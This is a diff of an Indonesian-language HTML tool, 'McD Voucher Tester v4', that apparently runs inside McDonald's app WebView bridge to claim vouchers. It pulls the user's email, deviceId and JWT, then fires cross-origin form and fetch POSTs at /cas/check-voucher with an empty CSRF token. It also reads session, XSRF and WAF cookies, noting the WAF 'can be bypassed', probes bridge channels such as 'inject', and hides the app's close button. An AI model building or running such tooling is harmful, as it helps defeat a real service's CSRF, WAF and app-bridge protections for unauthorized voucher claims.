@@ -272,7 +272,7 @@
       name="viewport"
       content="width=device-width, initial-scale=1, shrink-to-fit=no"
     />
-    <title>McD Voucher Tester v3 — Single HTML</title>
+    <title>McD Voucher Tester v4 — Single HTML</title>
     <style>
       * {
         box-sizing: border-box;
@@ -384,11 +384,18 @@
         padding: 6px 10px;
         font-size: 11px;
       }
+      button.gold {
+        background: #ff9800;
+        color: #000;
+      }
       button:not(:disabled):hover {
         background: #d6260c;
       }
       button.ghost:hover {
         background: #3a3d45;
+      }
+      button.gold:hover {
+        background: #ffb733;
       }
 
       .strategies {
@@ -397,13 +404,35 @@
         flex-wrap: wrap;
         margin-bottom: 8px;
       }
+      .strategy-row {
+        margin-bottom: 8px;
+        padding: 8px;
+        background: #1a1d24;
+        border-radius: 4px;
+      }
+      .strategy-row h3 {
+        margin: 0 0 6px;
+        font-size: 11px;
+        color: #c02101;
+        text-transform: uppercase;
+      }
+      .strategy-row p {
+        margin: 0 0 6px;
+        font-size: 11px;
+        color: #8b919e;
+      }
+      .strategy-row .actions {
+        display: flex;
+        gap: 6px;
+        flex-wrap: wrap;
+      }
 
       .log-box {
         background: #000;
         border: 1px solid #2a2d35;
         border-radius: 3px;
         padding: 8px;
-        height: 220px;
+        height: 240px;
         overflow-y: auto;
         font-family: "SF Mono", Monaco, Consolas, monospace;
         font-size: 10px;
@@ -470,6 +499,22 @@
         background: #ff9800;
         color: #fff;
       }
+      .badge.fail {
+        background: #f44336;
+        color: #fff;
+      }
+      .info-box {
+        background: #1a1d24;
+        border-left: 3px solid #ff9800;
+        padding: 10px;
+        margin: 10px 0;
+        font-size: 11px;
+        color: #e4e6eb;
+        border-radius: 3px;
+      }
+      .info-box strong {
+        color: #ff9800;
+      }
       @media (max-width: 600px) {
         .grid {
           grid-template-columns: 1fr;
@@ -485,7 +530,17 @@
   </head>
   <body>
     <div class="container">
-      <h1>McD Voucher Tester v3 — Single HTML (Multi-Strategy)</h1>
+      <h1>McD Voucher Tester v4 — Single HTML</h1>
+
+      <div class="info-box">
+        <strong>Status:</strong> CSRF token dibutuhkan oleh /cas/check-voucher
+        (419 confirmed). Strategy 1-4 akan kena 419 juga karena tidak bisa baca
+        CSRF dari cross-origin. <br /><br />
+        <strong>Rekomendasi:</strong> Pakai
+        <strong>Strategy 5 (Redirect ke halaman asli McD)</strong> — paling
+        pasti jalan. Voucher auto-terisi, user tinggal klik 1 tombol di halaman
+        McD.
+      </div>
 
       <div class="grid">
         <div class="section">
@@ -515,7 +570,7 @@
           <div id="mcd-id" class="value empty">-</div>
         </div>
         <div class="section" style="grid-column: 1 / -1">
-          <div class="label">JWT AuthCode (refresh tiap klik tombol)</div>
+          <div class="label">JWT AuthCode</div>
           <div id="jwt-authcode" class="value empty">-</div>
         </div>
       </div>
@@ -532,11 +587,52 @@
         <button id="get-authcode-btn" class="ghost">Get AuthCode</button>
       </div>
 
-      <div class="strategies">
-        <button id="strategy-fetch" disabled="">1. Fetch no-cors</button>
-        <button id="strategy-form-iframe" disabled="">2. Form → Iframe</button>
-        <button id="strategy-form-top" disabled="">3. Form → Top</button>
-        <button id="strategy-mcdid" disabled="">4. Pakai mcdonaldsId</button>
+      <!-- STRATEGY 5 - REKOMENDASI UTAMA -->
+      <div class="strategy-row" style="border: 1px solid #ff9800">
+        <h3>Strategy 5 — Redirect ke Halaman McD Asli (REKOMENDASI)</h3>
+        <p>
+          Voucher auto-terisi di halaman McD asli. User tinggal klik "Gunakan
+          Kode Kupon" 1x. Same-origin → CSRF + cookies + JWT semua jalan.
+        </p>
+        <div class="actions">
+          <button id="strategy-redirect" class="gold" disabled="">
+            Go to McD Redemption
+          </button>
+          <button id="strategy-redirect-newtab" class="ghost" disabled="">
+            Open in new tab
+          </button>
+        </div>
+      </div>
+
+      <!-- STRATEGY 1-4 (kemungkinan 419) -->
+      <div class="strategy-row">
+        <h3>Strategy 1-4 — Eksperimen (kemungkinan 419)</h3>
+        <p>
+          Form/fetch ke /cas/check-voucher langsung. CSRF butuh, kemungkinan
+          besar 419.
+        </p>
+        <div class="actions">
+          <button id="strategy-fetch" disabled="">1. Fetch no-cors</button>
+          <button id="strategy-form-iframe" disabled="">
+            2. Form → iframe
+          </button>
+          <button id="strategy-form-top" disabled="">3. Form → top</button>
+          <button id="strategy-mcdid" disabled="">4. Pakai mcdonaldsId</button>
+        </div>
+      </div>
+
+      <!-- STRATEGY 6 - PROBE BRIDGE -->
+      <div class="strategy-row">
+        <h3>Strategy 6 — Probe Bridge Channels (eksperimental)</h3>
+        <p>
+          Cek channel bridge lain yang mungkin bisa trigger klaim langsung
+          (offerActivation, inject, dll).
+        </p>
+        <div class="actions">
+          <button id="strategy-probe" class="ghost" disabled="">
+            Probe Bridge
+          </button>
+        </div>
       </div>
 
       <div class="section">
@@ -553,7 +649,6 @@
       </div>
     </div>
 
-    <!-- Hidden form untuk strategy 2 & 3 -->
     <form
       id="claimForm"
       method="POST"
@@ -564,7 +659,6 @@
       <input type="hidden" name="deviceId" id="f-deviceId" value="" />
       <input type="hidden" name="voucher" id="f-voucher" value="" />
       <input type="hidden" name="authorizationCode" id="f-authCode" value="" />
-      <!-- _token sengaja kosong — lihat apakah /cas/* di-exclude dari CSRF -->
       <input type="hidden" name="_token" value="" />
     </form>
 
@@ -583,7 +677,6 @@
         var firstname = "";
         var lastname = "";
         var bridgeReady = false;
-        var clicked = false;
 
         function log(msg, type) {
           type = type || "sys";
@@ -632,8 +725,12 @@
             "strategy-form-iframe",
             "strategy-form-top",
             "strategy-mcdid",
+            "strategy-redirect",
+            "strategy-redirect-newtab",
+            "strategy-probe",
           ].forEach(function (id) {
-            document.getElementById(id).disabled = !enable;
+            var btn = document.getElementById(id);
+            if (btn) btn.disabled = !enable;
           });
         }
 
@@ -727,17 +824,33 @@
           });
         }
 
-        // ============ STRATEGY 1: fetch mode:'no-cors' ============
-        // Fire-and-forget. Server proses request, response opaque (tidak bisa dibaca).
-        // Cek hasil lewat app McD (kupon baru muncul = sukses).
-        async function strategyFetchNoCors(voucherCode, authCode) {
-          log("--- STRATEGY 1: fetch no-cors ---", "sys");
-          log("POST " + BASE_URL + "/cas/check-voucher", "info");
-          log("Body: email, deviceId, voucher, authorizationCode", "info");
+        // ============ STRATEGY 5: REDIRECT KE HALAMAN ASLI ============
+        function strategyRedirect(voucherCode, newTab) {
+          log("--- STRATEGY 5: Redirect ke halaman McD asli ---", "sys");
+          var url =
+            BASE_URL + "/redemption?code=" + encodeURIComponent(voucherCode);
+          log("URL: " + url, "info");
           log(
-            "Note: response opaque, tidak bisa dibaca. Cek app McD untuk verifikasi.",
-            "warn",
+            'Halaman McD akan load dengan voucher terisi: "' +
+              voucherCode +
+              '"',
+            "ok",
           );
+          log(
+            'User klik "Gunakan Kode Kupon" di halaman McD → claim terjadi same-origin',
+            "info",
+          );
+
+          if (newTab) {
+            window.open(url, "_blank");
+          } else {
+            window.location.href = url;
+          }
+        }
+
+        // ============ STRATEGY 1-4 (eksperimen, kemungkinan 419) ============
+        async function strategyFetchNoCors(voucherCode, authCode) {
+          log("--- STRATEGY 1: fetch no-cors (kemungkinan 419) ---", "sys");
           try {
             var res = await fetch(BASE_URL + "/cas/check-voucher", {
               method: "POST",
@@ -755,12 +868,12 @@
                 res.type +
                 " status=" +
                 res.status +
-                " (opaque biasanya status=0)",
+                " (response opaque)",
               "info",
             );
             log(
-              "Kalau voucher muncul di app McD dalam 1-2 menit → sukses",
-              "ok",
+              "Kalau 419, tak bisa lihat. Cek app McD untuk verifikasi.",
+              "warn",
             );
           } catch (e) {
             log(
@@ -770,64 +883,153 @@
           }
         }
 
-        // ============ STRATEGY 2: Form submit ke iframe ============
-        // Form bypass CORS + kirim cookies otomatis.
-        // Response tampil di iframe (visual feedback).
         async function strategyFormIframe(voucherCode, authCode) {
-          log("--- STRATEGY 2: Form POST → iframe ---", "sys");
-          log(
-            "Form mengirim cookies bts-360 (WAF + Laravel session) otomatis",
-            "info",
-          );
-          log(
-            "_token sengaja kosong — lihat apakah /cas/* excluded dari CSRF",
-            "warn",
-          );
-
+          log("--- STRATEGY 2: Form → iframe (kemungkinan 419) ---", "sys");
           document.getElementById("f-email").value = email;
           document.getElementById("f-deviceId").value = deviceId;
           document.getElementById("f-voucher").value = voucherCode;
           document.getElementById("f-authCode").value = authCode;
-
           var form = document.getElementById("claimForm");
           form.target = "responseFrame";
           form.action = BASE_URL + "/cas/check-voucher";
           form.submit();
-          log("Form submitted ke iframe. Lihat response di bawah.", "info");
+          log(
+            "Form submitted. Lihat iframe untuk response (kemungkinan 419).",
+            "info",
+          );
         }
 
-        // ============ STRATEGY 3: Form submit ke top (navigate WebView) ============
-        // Form submit, navigasi seluruh WebView ke halaman response.
-        // User lihat hasil langsung di layar penuh.
         async function strategyFormTop(voucherCode, authCode) {
-          log("--- STRATEGY 3: Form POST → _top (navigate) ---", "sys");
-          log("WebView akan navigasi ke /cas/check-voucher response", "warn");
-          log("Tombol back app McD untuk kembali ke HTML ini", "warn");
-
+          log("--- STRATEGY 3: Form → _top (kemungkinan 419) ---", "sys");
           document.getElementById("f-email").value = email;
           document.getElementById("f-deviceId").value = deviceId;
           document.getElementById("f-voucher").value = voucherCode;
           document.getElementById("f-authCode").value = authCode;
-
           var form = document.getElementById("claimForm");
           form.target = "_top";
           form.action = BASE_URL + "/cas/check-voucher";
           form.submit();
         }
 
-        // ============ STRATEGY 4: Pakai mcdonaldsId sbg authCode ============
-        // Skip getAuthCode, langsung pakai Bearer token dari getuser.
         async function strategyMcdId(voucherCode) {
           if (!mcdonaldsId) {
             log("mcdonaldsId belum ada", "fail");
             return;
           }
-          log("--- STRATEGY 4: Form POST pakai mcdonaldsId ---", "sys");
-          log("authCode = mcdonaldsId (Bearer token dari bridge)", "info");
+          log(
+            "--- STRATEGY 4: Form pakai mcdonaldsId (kemungkinan 419) ---",
+            "sys",
+          );
           await strategyFormIframe(voucherCode, mcdonaldsId);
         }
 
-        // ============ GET AUTHCODE BUTTON ============
+        // ============ STRATEGY 6: PROBE BRIDGE + COOKIE TEST ============
+        function strategyProbe() {
+          log("--- STRATEGY 6: Probe Bridge + Cookie Test ---", "sys");
+
+          // TEST 1: Cross-origin cookie reading via document.cookie
+          log("TEST COOKIE: document.cookie di origin ini", "info");
+          var allCookies = document.cookie || "(empty)";
+          log("document.cookie = " + allCookies, "info");
+          if (allCookies.indexOf("XSRF-TOKEN") !== -1) {
+            var match = allCookies.match(/XSRF-TOKEN=([^;]+)/);
+            if (match) {
+              log(
+                "XSRF-TOKEN cookie DITEMUKAN: " +
+                  match[1].substring(0, 40) +
+                  "...",
+                "ok",
+              );
+              log(
+                "Ini berarti WebView allow cross-origin cookie access!",
+                "ok",
+              );
+              log(
+                "Tapi _token butuh plain value, XSRF-TOKEN cookie = encrypted",
+                "warn",
+              );
+            }
+          } else {
+            log(
+              "XSRF-TOKEN cookie TIDAK ADA — WebView restrict cross-origin cookies",
+              "fail",
+            );
+          }
+          if (allCookies.indexOf("laravel_session") !== -1) {
+            log("laravel_session cookie ADA!", "ok");
+          }
+          if (allCookies.indexOf("aws-waf-token") !== -1) {
+            log("aws-waf-token cookie ADA — WAF bisa di-bypass!", "ok");
+          }
+
+          // TEST 2: Bridge channels
+          log("", "sys");
+          log("TEST BRIDGE: daftar channel yang tersedia", "info");
+          var b = getBridgeRoot();
+          if (!b) {
+            log("Bridge null", "fail");
+            return;
+          }
+          log("Bridge root keys:", "info");
+          Object.keys(b).forEach(function (key) {
+            log("  bridge." + key + " = " + typeof b[key], "sys");
+          });
+          if (b.bridge && typeof b.bridge === "object") {
+            log("Bridge.bridge keys:", "info");
+            Object.keys(b.bridge).forEach(function (key) {
+              log(
+                "  bridge.bridge." + key + " = " + typeof b.bridge[key],
+                "sys",
+              );
+            });
+          }
+
+          var channels = [
+            "user",
+            "system",
+            "offerActivation",
+            "inject",
+            "network",
+            "http",
+            "request",
+            "navigation",
+            "cookie",
+            "storage",
+          ];
+          log("Coba akses channel候选...", "info");
+          channels.forEach(function (ch) {
+            try {
+              var connector = b.message(ch);
+              if (connector) {
+                log('Channel "' + ch + '": connector OK', "ok");
+                if (typeof connector.send === "function") {
+                  log("  " + ch + ".send is function", "ok");
+                }
+              }
+            } catch (e) {
+              log('Channel "' + ch + '": ' + (e.message || e), "fail");
+            }
+          });
+
+          // TEST 3: Try b.get() if available (used by shield)
+          if (typeof b.get === "function") {
+            log('bridge.get() exists — coba channel "inject"', "info");
+            try {
+              var injectConn = b.get("inject");
+              if (injectConn) {
+                log("inject channel via .get() OK", "ok");
+                log(
+                  "injectConn keys: " + Object.keys(injectConn).join(","),
+                  "info",
+                );
+              }
+            } catch (e) {
+              log('bridge.get("inject") error: ' + e, "fail");
+            }
+          }
+        }
+
+        // ============ BUTTON HANDLERS ============
         document
           .getElementById("get-authcode-btn")
           .addEventListener("click", async function () {
@@ -842,7 +1044,32 @@
             this.textContent = "Get AuthCode";
           });
 
-        // ============ STRATEGY BUTTONS ============
+        document
+          .getElementById("strategy-redirect")
+          .addEventListener("click", function () {
+            var v = (document.getElementById("voucher-input").value || "")
+              .trim()
+              .toUpperCase();
+            if (!v) {
+              log("Isi voucher dulu", "warn");
+              return;
+            }
+            strategyRedirect(v, false);
+          });
+
+        document
+          .getElementById("strategy-redirect-newtab")
+          .addEventListener("click", function () {
+            var v = (document.getElementById("voucher-input").value || "")
+              .trim()
+              .toUpperCase();
+            if (!v) {
+              log("Isi voucher dulu", "warn");
+              return;
+            }
+            strategyRedirect(v, true);
+          });
+
         document
           .getElementById("strategy-fetch")
           .addEventListener("click", async function () {
@@ -920,6 +1147,10 @@
           });
 
         document
+          .getElementById("strategy-probe")
+          .addEventListener("click", strategyProbe);
+
+        document
           .getElementById("clear-iframe")
           .addEventListener("click", function () {
             document.getElementById("responseFrame").src = "about:blank";
@@ -931,50 +1162,39 @@
           setBridgeStatus("on");
           bridgeReady = true;
 
-          // Hide McD UI
           try {
             var system = mcd.bridge.message("system");
             system.send({ hideNavigationbar: true, hideCloseButton: true });
             log("system.send hideNavigationbar + hideCloseButton", "info");
           } catch (e) {}
 
-          // clientId pakai fallback (cas/configuration kemungkinan WAF block)
           clientId = FALLBACK_CLIENT_ID;
           log("clientId pakai fallback: " + clientId, "warn");
 
-          // Get user data
           try {
             await getUserData();
           } catch (e) {
             log("Gagal ambil user data", "fail");
           }
 
-          // Enable strategy buttons (semua strategy butuh email+deviceId)
           if (email && deviceId) {
             enableStrategyButtons(true);
-            log("=== SIAP — pilih strategy di bawah ===", "ok");
+            log("=== SIAP ===", "ok");
             log(
-              "Strategy 1: fetch no-cors (fire & forget, cek app McD)",
-              "info",
+              "REKOMENDASI: Pakai Strategy 5 (Redirect ke halaman McD asli)",
+              "ok",
             );
             log(
-              "Strategy 2: Form ke iframe (response di kotak putih bawah)",
+              "Strategy 5: voucher auto-terisi, klik 1 tombol di McD page",
               "info",
             );
-            log(
-              "Strategy 3: Form ke _top (navigasi WebView, lihat hasil fullscreen)",
-              "info",
-            );
-            log(
-              "Strategy 4: Form pakai mcdonaldsId sbg authCode (skip getAuthCode)",
-              "info",
-            );
+            log("Strategy 1-4: kemungkinan 419 (CSRF butuh)", "warn");
+            log("Strategy 6: probe bridge channels lain", "info");
           } else {
             log("email/deviceId belum lengkap", "fail");
           }
         });
 
-        // Fallback kalau bridge sudah ready sebelum listener dipasang
         if (getBridgeRoot()) {
           log("Bridge sudah tersedia, trigger manual", "warn");
           setTimeout(function () {
@@ -987,10 +1207,6 @@
         log("Page loaded. Base URL: " + BASE_URL, "sys");
         log("Fallback clientId: " + FALLBACK_CLIENT_ID, "sys");
         log("Menunggu mcdBridgeReady...", "sys");
-        log(
-          "Tip: kalau fetch /cas/* gagal, pakai Strategy 2 atau 3 (form)",
-          "warn",
-        );
       })();
     </script>
   </body>
